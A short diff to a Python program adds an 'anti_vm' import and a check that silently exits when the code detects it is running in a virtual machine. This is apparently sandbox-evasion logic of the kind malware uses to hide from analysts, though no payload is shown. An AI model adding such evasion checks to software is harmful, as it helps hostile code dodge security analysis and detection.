@@ -33,7 +33,10 @@ import ctypes
 import re
 import json
 import psutil
+from resources.anti_vm import is_running_in_vm
 
+if is_running_in_vm():
+    os._exit(0)
 
 
 
